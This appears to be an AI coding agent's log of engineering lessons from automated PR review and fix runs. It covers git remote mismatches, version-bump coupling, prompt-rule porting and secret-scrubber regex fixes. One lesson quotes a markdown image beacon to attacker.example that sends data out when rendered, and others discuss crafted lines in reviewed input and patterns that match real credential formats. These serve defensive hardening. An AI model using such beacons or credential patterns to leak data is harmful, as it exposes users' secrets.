The one place emptiness *was* handled reinforced the illusion: the `REPO_MATCHES_LOCAL` block a few lines below correctly tests `[ -n "$NAME_WITH_OWNER" ]`, so the file contains a check for exactly this condition — just not on the path that dereferences it. Bash's silent-empty-expansion default (`${VAR%%/*}` on an unset variable is not an error) means nothing surfaces until the value has already been concatenated into a command line.
- **Apply next time**: for every value produced by a command substitution that can legitimately fail, write the empty-check adjacent to the *first consumer that cannot proceed without it*, not only where the value is produced or where one other branch happens to test it — and make the check terminate with the domain-accurate message, before the value reaches any downstream command. Concretely: `if [ -z "$X" ]; then : "report: <specific cause and remedy>, and stop"; fi` immediately inside the branch. Two tells to grep for when reviewing a documented shell snippet: a `$(...)` whose stderr is suppressed with `2>/dev/null` (the failure is now invisible by construction), and a variable interpolated into a *path-shaped* argument (`"$A/$B"`, `--repo`, a URL) where an empty half still produces a syntactically valid string that means something else. Also: finding one guard for a condition in a file is not evidence the condition is guarded — check every path that dereferences the value. Related: [[L-2026-07-29-12]], [[L-2026-07-26-48]].

## L-2026-07-29-15 — In eva-fix-pr's cross-repo checkout, `origin` points at ievo-ai/eva while the tree is the target repo; `git fetch/push origin` is wrong and `git fetch origin main` silently repoints origin/main

- **Source**: eva-fix-pr run for ievo-ai/skills#504 (branch `eva-impl/468-review-retrospective`, cross-repo fix, round 5) — infrastructure observation, verified in-run, not a review finding
- **Signal**: in this run's working tree (`/home/runner/work/eva/eva`, containing ievo-ai/**skills** content and refs — `FETCH_HEAD` records fetches from `https://github.com/ievo-ai/skills`), `git remote get-url origin` returned `https://…@github.com/ievo-ai/**eva**.git`. Three concrete consequences observed: (1) the prompt's own Phase 2 recipe, `git fetch origin "$BASE"`, fetched *eva's* `main` and force-updated `refs/remotes/origin/main` from skills' `83114b3` to eva's `9d9766f`, after which `git merge-base HEAD origin/main` failed with no common ancestor and the `[pr-fix-N]` budget count was computed against the wrong history (restored with an explicit `git fetch https://github.com/ievo-ai/skills.git +refs/heads/main:refs/remotes/origin/main`); (2) `git push origin HEAD` — the literal command in Phase 6 — would push the branch into ievo-ai/eva and never update the PR; (3) `.git/config` carries a repo-local `[user] name = claude[bot]`, which overrides the workflow's `git config --global user.name "iEVO Eva"` step, so `HEAD` (`[pr-fix-4]`) is authored by `claude[bot]`, not the `ievo-eva[bot]` the workflow's comments state it attributes to. Cause is upstream of the prompt: `anthropics/claude-code-action@v1` configures git for `github.repository` (the *workflow's* repo, eva) on top of the `actions/checkout` of `steps.ctx.outputs.repo` (the *target* repo, skills).
- **Root cause**: the fixer prompt is written as if `origin` always names `$TARGET_REPO`, which holds for an eva-repo fix (where workflow repo and target repo coincide) and silently fails to hold for every cross-repo fix — the exact case Phase 3c exists for. The two identities are never reconciled, and neither `git fetch` nor `git push` errors when pointed at a repo that simply lacks the ref; `fetch` quietly rewrites a remote-tracking ref, `push` quietly creates a branch in the wrong repo. Nothing in the run surfaces the mismatch, because both repos are real, both are writable by the same token, and the branch name exists in only one of them.
- **Apply next time**: on any eva-fix-pr run, verify the push/fetch target before using it — `git remote get-url origin` compared against `$TARGET_REPO` — and when they disagree, address the target repo by explicit URL rather than by remote name and rather than mutating the remote (the prompt forbids changing remotes, and it does not need changing): `git fetch https://github.com/$TARGET_REPO.git +refs/heads/<base>:refs/remotes/origin/<base>` and `git push https://github.com/$TARGET_REPO.git HEAD:<head_ref>`. Never assume a remote-tracking ref names what its path suggests in a workspace assembled by more than one action. Also set `git config user.name/user.email` at **repo** scope before committing, since a repo-local identity beats the workflow's `--global` one. Structural fix worth filing on the eva side: have eva-fix-pr.yml re-assert the remote URL and the committer identity at repo scope after the checkout, and replace the prompt's bare `git fetch origin`/`git push origin HEAD` with `$TARGET_REPO`-explicit forms. Related: [[L-2026-07-29-11]].

## L-2026-07-30-01 — Porting a rule scoped to "these output fields" must re-derive the field set from the DESTINATION template's rendering surface; a heading slot is a field even though it has no `Label:`

- **Source**: eva-fix-pr run for ievo-ai/skills#508 (branch `eva-impl/505-deep-reviewer-excerpt-containment`, cross-repo fix, round 1)
- **Signal**: Eva's REQUEST_CHANGES — "Faithful port, but it drops one field. `vuln-scanner.md`'s rule covers `title`; the analog here is the finding heading `#### [<sev>] <category> — <short title>` (deep-reviewer.md:179) … a crafted line quoted in a finding title still fires live." The implementation ported `vuln-scanner.md`'s excerpt-containment rule to `deep-reviewer.md` and named exactly two fields, `Issue:` and `Suggestion:`, in all three places it landed (the Step 3 note's own heading and body, the `## Rules` bullet, and `deep-review/SKILL.md` Step 5's display-side mirror). The source rule's own field list is `title`, `exploit_chain.*`, `recommendation` — three fields, one of which is the finding's *title* — and the destination template has a title too, in its `#### [<severity>] <category> — <short title>` heading, which CommonMark renders with inline images/links live exactly as the body bullets do. So the one field the source rule listed first was the one the port dropped.
- **Root cause**: the port was done by mapping the source's field *names* onto the destination's field names, and the two templates have different shapes — `vuln-scanner.md` emits a JSON object where every slot is a named key, `deep-reviewer.md` emits Markdown where the body slots are `- **Issue:** …` bullets but the title slot is a `####` heading. Reading the destination template for "which fields does this rule apply to?", the eye lands on the things that look like fields (the labelled bullets) and skips the heading, because a heading reads as *structure* rather than as *content*. The rendering surface doesn't care: a heading line is ordinary Markdown text, and `![x](https://attacker.example/beacon.png?d=…)` in a `####` fires exactly as it would in a bullet. The same name-mapping habit also left the shipped CHANGELOG bullet describing the rule as covering `Issue:`/`Suggestion:` only, so the fix had to correct that entry in place rather than append a new one.
- **Apply next time**: when porting a rule whose scope is "these output fields", do not translate the source's field list — enumerate the destination template slot by slot and ask of *each* slot "can free text from the untrusted input reach here, and does this slot render?" Every `<placeholder>` in the destination template is a candidate, including ones inside headings, list markers, table cells, and summary lines, none of which carry a `Label:`. Then check the ported prose names the same set in every place it appears: a rule that lands in N locations (a note, a `## Rules` bullet, a consumer-side mirror, a CHANGELOG entry) has N independent field enumerations, and they stay in sync only if you edit them as one unit. Related: [[L-2026-07-29-07]], [[L-2026-07-29-04]], [[L-2026-07-26-49]].


## L-2026-07-30-02 — Porting a security rule from a sibling agent must port the rule it explicitly defers to, not just the named paragraph

- **Source**: eva-fix-pr run for ievo-ai/skills#508 (branch `eva-impl/505-deep-reviewer-excerpt-containment`, cross-repo fix)
- **Signal**: Eva's own REQUEST_CHANGES review found the port itself faithful (version coupling across all 6 files + ledger correct, CHANGELOG structure correct) but flagged that the excerpt-containment paragraph was lifted from `plugins/ievo/agents/vuln-scanner.md` **without its counterweight**. The ported text at `deep-reviewer.md:220` directs the agent to keep an excerpt "verbatim (never delete or paraphrase it away)", while that same agent's Point 11 ("Leaked secrets in the diff") has it match real `sk-ant-`/`ghs_`/`AKIA` keys and `-----BEGIN * PRIVATE KEY-----` material out of the diff, and `deep-review/SKILL.md` Step 5 prints the report as-is into the chat UI. `vuln-scanner.md` pairs the identical containment paragraph with a `## Rules` bullet — "Never echo raw secret values … Takes precedence over excerpt containment for the secret substring specifically: redact first, then fence" — that exists precisely to stop containment from fencing-and-echoing a live credential. `deep-reviewer.md` had no such bullet, so the port turned a redaction obligation into a "quote it verbatim, in a code span" instruction for exactly the material Point 11 hunts for.
- **Root cause**: I scoped the port by the *name* of the thing being ported ("the excerpt-containment rule"), diffing the source and destination agents for that paragraph and its one companion `## Rules` bullet ("Neutralize excerpts before they render"). The source's containment text contains an explicit deference marker — another rule is described as taking *precedence* over it — which means the paragraph is one half of a two-rule pair and is unsafe alone. I never read the source agent's full `## Rules` section to find what the ported text defers to, and the destination's own Point 11 (which supplies the dangerous input the counterweight guards) was never cross-checked against the new instruction. Both product gates were green and stayed green: this is prose in a reference `.md`, invisible to the coverage gate, the version-bump gate, and every pre-commit validator.
- **Apply next time**: when porting a rule/paragraph between sibling agents or skills, first grep the SOURCE file for the ported text's own precedence/deference language (`takes precedence`, `overrides`, `see … Rules`, `redact first`, `unless`) and for every `## Rules` bullet that names the same fields the ported text governs — a rule that says another rule outranks it is by construction half a pair, and porting the half that *relaxes* a constraint without the half that *restores* it inverts the source's net safety posture. Then read the DESTINATION's own steps for whoever supplies the input the ported rule now governs (here: Point 11's credential matching) and confirm the ported instruction is safe over that input specifically. Cross-references both ways — the counterweight bullet, plus a forward pointer from the step that generates the risky input — are what make the pair survive the next port; see [[L-2026-07-23-01]] for the same "the named location is a floor, not a ceiling" failure shape in a test-update context.


## L-2026-07-30-03 — A fail-safe REQUEST_CHANGES from a reviewer that never ran is not a finding; the fixer's only lawful move is a labelled decline, and the dispatch itself is the defect

- **Source**: eva-fix-pr run for ievo-ai/skills#508 (branch `eva-impl/505-deep-reviewer-excerpt-containment`, cross-repo fix, round 3 attempt) — the triggering review carried no finding
- **Signal**: `REVIEW_ID=4817346347`'s entire body was eva-review-pr's own parse guard: "Eva could not parse her own review output (no standalone APPROVE or REQUEST_CHANGES line, or both present). Defaulting to REQUEST_CHANGES so the PR does NOT auto-merge. […] `API Error: 529 Overloaded.` […] Raw Claude output below — operator decides." The reviewer process died on a transient upstream 529 *before* producing any review of the diff, so the fixer's one authoritative input contained zero statements about the code. The two earlier reviews on the same PR (`4817128119`, `4817244474`) were real and were already resolved by `[pr-fix-1]`/`[pr-fix-2]`, both product gates were green on the head commit, and the review's own text routed itself to the operator ("operator decides") — yet the fix dispatch fired anyway, and the fixer arrived with a budget slot available and nothing to spend it on.
- **Root cause**: eva-review-pr's fail-safe collapses two different failures into one outcome. "The reviewer ran and emitted something unparseable" and "the reviewer never ran because the API 5xx'd" both become `CHANGES_REQUESTED` + a `fix-pr` dispatch, because the guard keys on the *absence of a verdict line*, not on whether a review exists at all. The fail-safe's own purpose is satisfied by blocking auto-merge; dispatching the fixer is a separate decision that the missing-verdict signal does not justify. Downstream, the fixer's rules make every branch of this a cost: pushing anything would be a forbidden no-op that burns a budget slot, so the only correct exit is `eva-fix-declined` + `needs-operator` — a terminal label that also bars the fixer from re-entering the PR until a human clears it. A transient 529 therefore converts, with no bug anywhere in the fix logic, into blocked operator attention on a PR whose findings were already fixed.
- **Apply next time**: as fixer, classify the triggering review body before looking for work in it — if its payload is a tooling/API error or a parse-guard notice rather than prose *about the diff*, there is no finding, and no amount of re-reading the code will produce one. Confirm the prior rounds' findings are genuinely addressed with file/line evidence (cite them in the hand-off so the operator can re-review the claim, not just the label), report anything else blocking the PR that the fixer's scope bars it from touching, then decline with the terminal labels and leave the budget untouched. Never manufacture a plausible-looking fix to justify the dispatch, and never push a cosmetic commit just to re-fire the gates. Structural fix worth filing on the eva side: have eva-review-pr retry the reviewer on a 5xx/overloaded error, and when the fail-safe fires with no parseable findings, block auto-merge and flag the operator **without** dispatching `fix-pr` — a review that never happened has nothing for the fixer to converge on. Related: [[L-2026-07-29-15]].

## L-2026-07-30-04 — A PR can converge on "all findings fixed" and still be permanently unmergeable: a sibling PR's version bump conflicts the coupled files, and the fixer's scope rule forbids the rebase

- **Source**: eva-fix-pr run for ievo-ai/skills#508 (branch `eva-impl/505-deep-reviewer-excerpt-containment`, cross-repo fix) — infrastructure observation, verified in-run
- **Signal**: with both real review findings resolved and both product gates green, `gh api repos/ievo-ai/skills/pulls/508` reported `mergeable: false`, `mergeable_state: "dirty"`, `rebaseable: false`. `main` had moved from the PR's base `83114b3` to `54dbd3e` (#504 shipped v0.75.0) during the PR's three review rounds, while #508 bumps `0.74.3 → 0.74.4`. Intersecting each side's changed-file set against the merge base showed the conflict is entirely version coupling — `.claude-plugin/marketplace.json`, `AGENTS.md` (compliance ledger), `CHANGELOG.md`, `plugins/ievo/.claude-plugin/plugin.json`, and the three `SCRIPT_VERSION` constants in `discover.mjs`/`evolution_candidates.mjs`/`scrub.mjs` — while the PR's actual substance (`agents/deep-reviewer.md`, `skills/deep-review/SKILL.md`) is touched by this branch alone. Nothing in the pipeline had surfaced this: the review loop reads the diff, the fixer reads the review, and neither reads mergeability.
- **Root cause**: in a repo where every change must bump the same version sites in lockstep, any two concurrently-open PRs conflict *by construction* — the second to merge must rebase and re-derive its bump from current `main`, not from its own base. The review→fix loop's convergence criterion ("no findings remain") is orthogonal to mergeability, and the fixer's "fix ONLY the review findings" rule specifically bars it from performing the rebase that would clear it. So the automated loop can reach a fixed point that is *not* a mergeable state, with every actor behaving correctly and no actor responsible for noticing — the PR strands silently, and the version bump it carries is already stale besides.
- **Apply next time**: treat mergeability as a first-class end-of-run check, not an assumption — on every fix round and at the end of every implement run, read `gh api repos/<repo>/pulls/<n> --jq '{mergeable, mergeable_state}'` (or `gh pr view --json mergeStateStatus`) before declaring the PR ready or handing it off. When it is `dirty`, compute the conflict set explicitly (`comm -12` over `git diff --name-only $(git merge-base origin/main HEAD) HEAD` and `… origin/main`) and hand the operator the mechanical recipe — which files, and the re-bump target derived from *current* main's version — rather than a bare "conflicts". In a version-coupled repo, expect a branch's bump to go stale the instant a sibling PR merges, and never re-derive it from the branch's own base commit. Related: [[L-2026-07-29-12]], [[L-2026-07-27-12]].


## L-2026-07-31-01 — `check-version-bump.mjs` silently skips (exit 0, no validation) under a local `GITHUB_EVENT_NAME` that isn't `pull_request`, reading as a clean pass

- **Source**: eva-implement run for ievo-ai/skills#498 (branch `eva-impl/498-deep-reviewer-secret-redaction`), Phase 4d quality gate
- **Signal**: `node .github/scripts/check-version-bump.mjs` (and the same invocation with `--base origin/main --head HEAD`) printed `check-version-bump: skip — GITHUB_EVENT_NAME='repository_dispatch' (not a pull_request; already gated pre-merge)` and exited 0 — this run's own environment already has `GITHUB_EVENT_NAME=repository_dispatch` set (the eva-implement workflow's own trigger event), which the script's `main()` checks *before* even parsing `--base`/`--head`, so the CLI flags are silently ignored. This reads exactly like a passing gate (exit 0, a log line) but never actually diffed anything or checked a single version field. Confirmed by forcing `GITHUB_EVENT_NAME=pull_request node .github/scripts/check-version-bump.mjs --base origin/main --head HEAD`, which only then performed the real check (and initially still reported "no plugins/ievo/** changes" until the version bump was committed, since the script diffs committed refs, not the working tree).
- **Root cause**: the script's env-based skip (`env.GITHUB_EVENT_NAME && env.GITHUB_EVENT_NAME !== "pull_request"`) exists so a push-to-main run is a correct no-op (the PR gate already covered it pre-merge) — but a local dry-run in this harness inherits `GITHUB_EVENT_NAME=repository_dispatch` from the *outer* eva-implement workflow's own trigger, an unrelated event to the one the script's guard is reasoning about. The guard has no way to distinguish "this really is a post-merge push" from "this is a local dry-run happening to run inside an env that has some other GITHUB_EVENT_NAME set" — both look identical to it.
- **Apply next time**: when dry-running `check-version-bump.mjs` locally in this harness (or any check that self-skips on `GITHUB_EVENT_NAME`), override the env var explicitly for the dry-run: `GITHUB_EVENT_NAME=pull_request node .github/scripts/check-version-bump.mjs --base origin/main --head HEAD`. Also remember the script diffs *committed* refs (`git diff --name-only <merge-base> HEAD`), not the working tree — run it AFTER `git commit`, not before, or it will report "no plugin changes" even with staged/unstaged version bumps sitting right there. Treat a "skip" log line from any CI-mirroring local script as informative, never as evidence the check ran — grep the script for its own skip conditions before trusting a clean-looking exit 0.

## L-2026-07-31-02 — A NEW file that hand-copies the repo version ships born-stale when the version snapshot is taken at run start but the base branch moves before the branch is cut

- **Source**: eva-fix-pr run for ievo-ai/skills#517 (branch `eva-impl/501-root-agent-plugins-manifest`, cross-repo fix)
- **Signal**: Eva's own REQUEST_CHANGES review blocked the PR because the newly-added root `plugin.json` (Agent Plugins 1.0.0 manifest) shipped `"version": "0.75.3"` while EVERY version-carrying file in the same tree was already `0.75.4` (`plugins/ievo/.claude-plugin/plugin.json`, both `.claude-plugin/marketplace.json` fields, three `SCRIPT_VERSION` literals, the AGENTS.md compliance-ledger header). `0.75.4` had landed on `main` in commit `27d1bf5` *the same day*, two commits before this branch's merge-base — so the file was stale the moment it was authored. No gate could catch it: `check-version-bump.mjs` only fires on `plugins/ievo/**` / `.claude-plugin/**` prefixes, and a repo-root `plugin.json` matches neither, so both product gates stayed green on an already-drifted field. The same PR's AGENTS.md prose even documented the field as "synced opportunistically, not a hard requirement" — i.e. the implementer consciously exempted it from mechanical coupling and then failed the very first manual sync, in the commit that introduced it.
- **Root cause**: the version value was read once, early in the run (while `main` was still `0.75.3`), and re-used later when authoring a file created near the end of the build — but the branch was cut from a `main` that had advanced to `0.75.4` in the interim. Because the new file sits outside every gated glob *by design*, nothing re-validated the snapshot against the tree it actually landed in. Deliberately exempting a duplicated value from mechanical coupling silently converts it into a manual invariant that must be re-checked at write time, and a run-start snapshot is exactly the wrong source for it.
- **Apply next time**: when a change ADDS a file that duplicates a value already carried elsewhere in the repo (version, schema URL, package name), re-derive that value from the working tree at the moment the file is written — `grep -rn '"version"' <the repo's own version-carrying files>` immediately before authoring, never from a value read earlier in the run or from `gh api` against `main` at run start (`main` can advance between the read and the branch cut; here it did, same-day). And if the change's own documentation declares the new copy "not mechanically gated / synced opportunistically", treat that sentence as a hard prompt to verify the copy is correct *right now* — an ungated duplicate that ships already-drifted is strictly worse than omitting the optional field entirely (the reviewer's own framing: "honest > stale"). This is the additive-file mirror of [[L-2026-07-23-02]] (a plugin-file PR that omits the bump passes CI because the coupling tests catch drift, not absence): both are version invariants no gate covers.


## L-2026-07-31-03 — Fixing the instance of an ungated duplicated value leaves the defect class alive; when the reviewer offers "sync it or drop it", dropping is what removes the drift

- **Source**: eva-fix-pr run for ievo-ai/skills#517 (branch `eva-impl/501-root-agent-plugins-manifest`, cross-repo fix, round 2)
- **Signal**: round 1's review said "Bump to 0.75.4, **or** drop `version` (optional per spec — honest > stale)". `[pr-fix-1]` chose the bump — corrected the stale literal, kept the field, kept the AGENTS.md prose promising opportunistic sync. Round 2's review then blocked the same file again on the same field, one level up: "`plugin.json:4` adds a 6th copy of `0.75.4` that AGENTS.md exempts from the bump checklist and `check-version-bump.mjs` — a checklist AGENTS.md says went stale 3×. Prose-only sync guarantees drift at v0.75.5; `version` is optional here, so drop it or gate it." A whole fix round (and a budget slot) bought a value that was correct for exactly one release.
- **Root cause**: the two remedies a reviewer lists are rarely equivalent — one fixes the *instance*, the other removes the *class* — and the instance fix is the cheaper, more obviously-in-scope-looking edit, so it wins by default under a "minimal fix" rule. Here the field was, by the PR's own design, outside every glob CI gates (`check-version-bump.mjs` fires only on `plugins/ievo/**` / `.claude-plugin/**`), so "keep it in sync" was a promise with no enforcer, in a repo whose own AGENTS.md records that its hand-maintained bump checklist went stale three separate times. Syncing the value re-armed exactly that failure for the next bump; the spec made the field optional, so nothing but habit ("a manifest should carry a version") required it to exist at all.
- **Apply next time**: when a review offers two remedies, ask which one makes the finding un-reachable rather than which one is smaller. For a duplicated constant specifically, enumerate who enforces the copy — if the answer is prose, the only two honest end states are *mechanically gated* or *absent*, never "documented as synced opportunistically". A field that an external spec marks optional is the easy case: omit it and the drift class disappears with it. And when a fix round addresses only the instance, expect the same file to come back — the reviewer's second pass will state the class explicitly. Related: [[L-2026-07-31-02]], [[L-2026-07-23-02]].

## L-2026-07-31-04 — Documenting a conformance artifact's limits from the one client whose source you read leaves the spec's own resolution rules undocumented

- **Source**: eva-fix-pr run for ievo-ai/skills#517 (branch `eva-impl/501-root-agent-plugins-manifest`, cross-repo fix, round 2)
- **Signal**: Eva's REQUEST_CHANGES finding 2 — "It declares no component paths and the root has no `skills/`/`commands/`/`agents/` (they're in `plugins/ievo/`), so a spec-native client resolves an empty plugin — the documented caveat covers only Codex." The PR added a repo-root `plugin.json` (Agent Plugins 1.0.0) plus a long, genuinely rigorous AGENTS.md caveat — verified line by line against `codex-rs` source, naming `find_plugin_manifest_path`, `DISCOVERABLE_PLUGIN_MANIFEST_PATHS` and two upstream test names. All of it described Codex. The spec the file *declares conformance to* says (§6.1) clients discover components from fixed locations relative to the manifest's directory and "`plugin.json` cannot override these locations", and its 1.0.0 schema is closed (`additionalProperties: false`, no component-path field at all); §6.2 makes an absent `skills/` a non-error. The repo root has no `skills/` — iEvo's live under `plugins/ievo/`, where both marketplace sources already point — so *every* spec-native client, not just Codex, loads a valid plugin named `ievo` with zero components. The most-researched client got a caveat; the whole class the file was actually built for got none.
- **Root cause**: the caveat was written out of the research the implementation happened to do (a deep dive into one vendor's parser, prompted by verifying the issue's citation) rather than out of the normative document the artifact claims to satisfy. Depth in one client reads as thoroughness and suppresses the question "what does the spec itself say happens when someone loads this?" — the schema had already been read for *validation* (required fields, allowed keys) and mentally filed as "understood", while §6's discovery semantics, the part that decides whether the file does anything at all, was never read. Nothing could catch it: the manifest validates, both product gates stay green, and the defect exists only in what the prose omits.
- **Apply next time**: when adding a file whose whole value is conformance to an external spec, read that spec's *resolution/discovery* section, not only its schema, and write down what a conforming consumer actually gets — components discovered, fields consumed, behavior on absence — before documenting any single vendor's quirks. Then check the artifact's placement against those rules: a manifest whose fixed component locations resolve to nothing is metadata, and the docs must say so in those words. A per-vendor caveat is a *subset* of the spec-level statement, never a substitute for it; if the doc names a client, it owes the reader the client-independent sentence first. Related: [[L-2026-07-30-01]], [[L-2026-07-29-04]].


## L-2026-07-31-05 — Grep for ALL coupled SCRIPT_VERSION files before bumping, never bump from memory

**Source:** ievo-ai/skills#493 implement build (scrub.mjs multi-word secret redaction fix)
**Signal:** First `node --test` run after bumping only `scrub.mjs`'s `SCRIPT_VERSION` and the version-bump ledger files failed two coupling tests (`discover.test.mjs`, `evolution_candidates.test.mjs`) asserting their own `SCRIPT_VERSION` equals `plugin.json`'s version — both were left at the old value.
**Root cause:** Assumed the issue's own router-analysis comment (which named only `scrub.mjs` as the file to bump) was the complete list of coupled scripts, instead of independently verifying against the repo's own convention. `AGENTS.md`'s version-bump section explicitly warns this exact list "has gone stale before (twice)" and prescribes `grep -rn "SCRIPT_VERSION" plugins/ievo/scripts/*.mjs` as the authoritative check rather than trusting any cached/remembered list — a warning that was present in the file I had already read, but I bumped from memory of "the file the issue is about" instead of running the grep.
**Apply next time:** Before bumping any coupled version constant in a repo with a "bump every coupled file" convention, grep the pattern the repo's own docs specify to find every match, and diff that against what you're about to touch — do not rely on an issue/PR description's file list, since that describes the FIX's scope, not the BUMP's scope, and those two scopes are documented in this repo as having drifted apart before.

## L-2026-07-31-06 — A bound added to keep a new regex lookahead linear-time can silently cap match length too — restructure to avoid the bound, don't just reuse an existing one

**Source:** ievo-ai/skills#493 implement build (scrub.mjs multi-word secret redaction fix)
**Signal:** `/ievo:deep-review` flagged (not caught by my own tests, which all passed) that bounding a newly-added per-character lookahead at a fixed 255 chars — done to keep it linear-time, mirroring an existing 255-char bound elsewhere in the same file — also silently capped the *value itself* at 256 chars, regressing a case that was unbounded before my change (a long whitespace-free secret value). The fix I was writing was specifically about NOT truncating secret values, so introducing a new truncation via the safety bound defeated the fix's own purpose in the case that bound applied to.
**Root cause:** Treated "add a length cap, mirroring the existing pattern in this file" as a safe, idiomatic way to bound algorithmic cost, without checking whether that pattern's cap-vs-correctness tradeoff was appropriate on the new call site. The existing bound (`PROVIDER_SECRET_RE`, capped at 255) was safe there because provider-shaped tokens have a known realistic max length; reusing the same number for an unrelated free-text secret value (which the pre-fix code deliberately left unbounded) silently changed the contract.
**Apply next time:** When a new regex construct needs a complexity bound (e.g. to avoid ReDoS from a per-character lookahead), first check whether restructuring the match to consume larger atomic units (e.g. whole runs instead of one character at a time) removes the need for any length cap at all — that is both a stronger fix and avoids silently narrowing what the surrounding code is allowed to match. Only reach for a numeric cap when the thing being bounded genuinely has no legitimate unbounded case; don't reuse a cap from a different call site without checking that its tradeoff still holds.


## L-2026-07-31-07 — A new regex alternative that fires in a different lexical context must re-derive its stop set from that context; copying the sibling alternative's character class imports delimiters that aren't delimiters there

**Source:** eva-fix-pr run for ievo-ai/skills#520 (branch `eva-impl/493-scrub-multiword-secret-redaction`, round 1)
**Signal:** Eva's review found that `MALFORMED_QUOTED_VALUE` — a fallback alternative I added to `scrub.mjs`'s `ASSIGNMENT_RE` for a quoted value with no closing quote — used `[^,;\r\n]`, the same continuation class as the sibling `UNQUOTED_VALUE`. But that alternative only fires *after* an opening quote has been consumed, and inside a quoted value `,`/`;` are ordinary content, not delimiters. So `PASSWORD="my secret, more secret` (a truncated capture) redacted only up to the comma and copied `, more secret` through in cleartext — the exact partial-leak class the PR existed to close, reintroduced by the fix's own new code path, and untested.
**Root cause:** Authored the new alternative by analogy to the one next to it, treating "stops at `,;\r\n`" as a property of the file's value-matching convention rather than a property of the *unquoted* context that convention was derived for. The two alternatives are lexically different states — outside quotes vs. inside quotes — and a character's delimiter-ness is a fact about the state, not about the regex it sits in. Every other stop in the copied class (CRLF, the next-assignment lookahead) happened to remain valid inside quotes, which made the one that didn't invisible.
**Apply next time:** When adding an alternative to an existing alternation, enumerate its stop/terminator set from scratch against the context that alternative matches in, then diff that against the sibling you were tempted to copy and justify each difference out loud. Quoting state, escaping state, and nesting depth all change which characters are structural — a class copied across a state boundary is a bug until proven otherwise. For a redaction/scrubbing regex specifically, the failure is silent and fail-open, so write the "value contains the copied delimiter" case as a test the moment the new alternative exists. Related: [[L-2026-07-31-06]], [[L-2026-07-29-02]].

## L-2026-07-31-08 — Rewriting an existing test's fixture to keep it green is an unpinned behaviour change; pin the new behaviour with its own test and re-verify every "no change to X" claim, which is now probably false

**Source:** eva-fix-pr run for ievo-ai/skills#520 (branch `eva-impl/493-scrub-multiword-secret-redaction`, round 1)
**Signal:** Same review flagged two further things that were really one thing: my widening of `scrub.mjs`'s unquoted-value match "swallows diagnostic tails" (`run_id: 7f3a failed status 500` → `run_id: [REDACTED]`), and the CHANGELOG's **Scope** bullet still claimed "no change to ... home-path rewriting" when composite `scrub()` use provably changed — `token=<secret> at $HOME/work` now redacts the `$HOME` path away instead of rewriting it to `~/work`. The evidence for both was sitting in my own diff: I had rewritten two existing pipeline-ordering tests' fixtures to insert a comma delimiter, and written a careful comment explaining why, rather than reading that rewrite as the behaviour-change report it was.
**Root cause:** Treated "the existing test now fails, but for a reason I understand and consider acceptable" as a fixture problem to be documented, not as a discovered behaviour delta to be propagated. Because the delta never got its own test, it also never got compared against the entry's own scope claims — the "unaffected" list had been written from *which functions I edited* (`rewriteHomePaths`'s code is genuinely untouched) rather than from *which observable behaviours moved*, which is the only sense in which "unaffected" is a claim worth making.
**Apply next time:** Any time a pre-existing test's input or expectation has to change to accommodate your fix, stop and treat it as a finding: (1) add a NEW test that pins the changed behaviour explicitly, in its most on-the-nose form, so a future narrowing has to confront it; (2) re-derive every "no change to X" / "scope" / "unaffected" sentence in the changelog, PR body, and docs against that behaviour, not against the function list in the diff — a module can be textually untouched and behaviourally affected in composite use; (3) state the trade-off and why the chosen side is right (here: over-redaction is fail-closed for a secret scrubber, under-redaction is the bug). Rewritten fixtures are the highest-signal, most-ignored artefact in a diff. Related: [[L-2026-07-29-06]], [[L-2026-07-29-14]].


## L-2026-07-31-09 — A regex terminator is a position, not a character: define the closer by the boundary condition that must hold after it, and give the format's escape rule its due, or the "closing" quote is just the first interior one

**Source:** eva-fix-pr run for ievo-ai/skills#520 (branch `eva-impl/493-scrub-multiword-secret-redaction`, round 2)
**Signal:** Eva's review found that `scrub.mjs`'s *strict* quoted-value alternative still leaked the partial-redaction class the whole PR exists to close. I had rewritten it as a lazy inner match closing on a backreference to the opening quote (`(["'])([^\r\n]*?)\4`) to fix an opposite-type-quote bug — and that pattern happily closes on a same-type quote sitting **inside** the value: `PASSWORD='don't share this xyz` → `PASSWORD='[REDACTED]'t share this xyz`, `{"db_password":"p@ss\"real"}` likewise. The fixture I had just written, `PASSWORD='tis the season`, was a single apostrophe away from demonstrating it. Worse, the review's own prescribed fix (require a real delimiter after the closer) still left the class open one character further out: an escaped `\"` followed by a space satisfies that boundary, so `"p@ss\" real"` still closed early — a routine shape in the JSON-encoded tool output this scrubber exists to scrub.
**Root cause:** I specified the terminator lexically — "the next quote of the same type" — when what the grammar actually requires is a *position*: a same-type quote at which the value legitimately ends, i.e. one followed by a real delimiter and not preceded by an escape. Having fixed one bad-terminator instance (the opposite-type quote), I treated that alternative as done rather than re-deriving its full terminator set, which is how the same defect class reached a fourth consecutive round in a single regex. And I matched quote characters as raw bytes while parsing a format (JSON) whose spec says a backslash-escaped quote is content — the escape rule is part of the terminator definition, not a detail of the payload.
**Apply next time:** When you write or change any terminator — a regex closer, a delimiter scan, a parser stop condition — state it as a predicate over the *position*: what must precede it (escape state), what must follow it (a real delimiter or end of input), and which lexical state you are in. Write those three out explicitly before editing; a bare "the next X" is a bug until each is answered. Two force multipliers when the expression already has several branches: (1) after fixing one instance of a defect class, sweep **every other** branch of the same expression for the same class in the same round and enumerate all terminators side by side — otherwise each round closes one instance and ships the next, exactly what happened here; (2) when a reviewer prescribes a specific fix, implement it and then adversarially probe it one character past its own PoC — a prescribed fix is a hypothesis about the terminator set, and confirming or extending it is cheap while the context is hot. For a fail-open scrubber specifically, prefer the terminator rule that can only ever *widen* the redacted span: escape awareness qualifies because it can only push the accepted closer later, so it cannot introduce a new under-match — a monotonicity argument worth constructing deliberately, since it turns "did I break anything?" into an argument rather than a test sample. Related: [[L-2026-07-31-07]], [[L-2026-07-31-06]], [[L-2026-07-29-02]].

## L-2026-07-31-10 — A structural fix for a non-functional property (ReDoS, allocation, I/O) is a defect-class fix too: sweep every sibling branch for it in the same round, exactly as you would for a correctness bug

**Source:** eva-fix-pr run for ievo-ai/skills#520 (branch `eva-impl/493-scrub-multiword-secret-redaction`, round 3)
